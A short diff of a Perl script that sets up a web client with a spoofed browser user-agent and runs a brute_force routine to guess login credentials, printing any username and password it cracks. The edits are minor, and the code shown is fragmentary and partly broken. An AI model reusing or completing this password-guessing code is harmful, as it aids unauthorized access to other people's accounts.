@@ -45,8 +45,8 @@ EOL
 #Bot building
 my $cookie = new HTTP::Cookies(ignore_discard => 1);
 my $bot = LWP::UserAgent->new;
-$bot->timeout(10);
-$bot->agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
+$bot -> timeout(10);
+$bot -> agent("Mozilla/5.0 (Windows; U; Windows NT 6.1 en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18");
 $bot -> requests_redirectable => ['GET', 'HEAD', 'POST'];
 $bot -> protocols_allowed => (['http', 'https']);
 $bot -> cookie_jar($cookie);
@@ -153,7 +153,6 @@ sub brute_force {
         my $req = HTTP::Request->new(POST=>$res);
         if($bot){
           #figured out the issue, will update ASAP, once I get the code correct
-          $bot -> click;
           unless ($req =~ /Error/ig) {
             print color('red');
             print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
